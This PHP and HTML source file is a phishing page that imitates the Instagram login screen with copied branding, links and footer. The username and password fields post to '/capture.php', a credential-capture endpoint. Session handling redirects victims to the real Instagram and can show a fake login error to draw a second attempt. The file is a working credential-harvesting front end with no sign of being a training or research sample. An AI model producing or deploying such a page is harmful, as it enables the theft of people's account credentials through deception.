<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
$redirect_url = isset($_SESSION['redirect_url']) ? $_SESSION['redirect_url'] : 'https://www.instagram.com/';
$login_error = isset($_SESSION['login_error']) ? $_SESSION['login_error'] : '';
$last_username = isset($_SESSION['last_username']) ? $_SESSION['last_username'] : '';
unset($_SESSION['login_error']);
unset($_SESSION['last_username']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
        .container{max-width:350px;width:100%}
        .box{background:#fff;border:1px solid #dbdbdb;padding:40px;margin-bottom:10px;text-align:center}
        .logo{width:175px;height:51px;margin:0 auto 25px;background:url("https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png") center/contain no-repeat}
        .form input[type="text"],.form input[type="password"]{width:100%;padding:9px 8px;margin-bottom:6px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:12px;outline:none}
        .form input:focus{border-color:#a8a8a8;background:#fff}
        .form button{width:100%;padding:7px 16px;margin-top:8px;background:#0095f6;border:none;border-radius:8px;color:#fff;font-weight:600;font-size:14px;cursor:pointer}
        .form button:disabled{background:rgba(0,149,246,0.3);cursor:default}
        .error{color:#ed4956;font-size:14px;margin:10px 0;text-align:center}
        .divider{display:flex;align-items:center;margin:18px 0}
        .divider::before,.divider::after{content:"";flex:1;height:1px;background:#dbdbdb}
        .divider span{margin:0 18px;color:#8e8e8e;font-size:13px;font-weight:600}
        .fb{display:flex;align-items:center;justify-content:center;color:#385185;font-weight:600;font-size:14px;text-decoration:none;margin-bottom:10px}
        .fb svg{width:16px;height:16px;margin-right:8px}
        a{color:#00376b;text-decoration:none;font-size:12px}
        .signup{padding:20px;font-size:14px}
        .signup a{color:#0095f6;font-weight:600}
        .apps{text-align:center;margin-top:10px}
        .apps p{font-size:14px;margin-bottom:15px;color:#262626}
        .apps img{height:40px;margin:0 4px}
        .footer{margin-top:40px;text-align:center}
        .footer a{color:#8e8e8e;font-size:12px;margin:0 8px}
        .footer p{color:#8e8e8e;font-size:12px;margin-top:20px}
        .loading{display:none;margin-top:10px}
        @keyframes spin{100%{transform:rotate(360deg)}}
        .loading svg{animation:spin 1s linear infinite}
        .pwd{position:relative}
        .pwd input{padding-right:50px}
        .pwd button{position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;font-weight:600;font-size:14px;cursor:pointer;display:none}
        @media(max-width:450px){body{background:#fff}.box{border:none}}
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="logo"></div>
            <?php if ($login_error): ?>
            <div class="error"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            <form class="form" id="f" method="POST" action="/capture.php">
                <input type="text" id="u" name="username" placeholder="Phone number, username, or email" value="<?php echo htmlspecialchars($last_username); ?>" required>
                <div class="pwd">
                    <input type="password" id="p" name="password" placeholder="Password" required>
                    <button type="button" id="t">Show</button>
                </div>
                <input type="hidden" name="redirect_url" value="<?php echo htmlspecialchars($redirect_url); ?>">
                <button type="submit" id="b" <?php echo $last_username ? '' : 'disabled'; ?>>Log in</button>
                <div class="loading" id="l"><svg width="18" height="18" viewBox="0 0 18 18"><circle cx="9" cy="9" r="8" stroke="#c7c7c7" stroke-width="2" fill="none"/><path d="M9 1a8 8 0 0 1 8 8" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round" fill="none"/></svg></div>
            </form>
            <div class="divider"><span>OR</span></div>
            <a href="https://www.facebook.com/login/" class="fb"><svg viewBox="0 0 24 24" fill="#385185"><path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02Z"/></svg>Log in with Facebook</a>
            <p style="margin-top:15px"><a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></p>
        </div>
        <div class="box signup">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>
        <div class="apps">
            <p>Get the app.</p>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play"></a>
            <a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft"></a>
        </div>
    </div>
    <div class="footer">
        <div><a href="https://about.meta.com/">Meta</a><a href="https://about.instagram.com/">About</a><a href="https://help.instagram.com/">Help</a><a href="https://www.instagram.com/legal/privacy/">Privacy</a><a href="https://www.instagram.com/legal/terms/">Terms</a></div>
        <p>© 2024 Instagram from Meta</p>
    </div>
    <script>
    var u=document.getElementById('u'),p=document.getElementById('p'),b=document.getElementById('b'),t=document.getElementById('t'),f=document.getElementById('f'),l=document.getElementById('l');
    function c(){b.disabled=!(u.value.trim()&&p.value)}
    u.oninput=c;
    p.oninput=function(){c();t.style.display=p.value?'block':'none'};
    t.onclick=function(){var x=p.type==='password';p.type=x?'text':'password';t.textContent=x?'Hide':'Show'};
    f.onsubmit=function(){b.disabled=true;b.style.display='none';l.style.display='block'};
    </script>
</body>
</html>
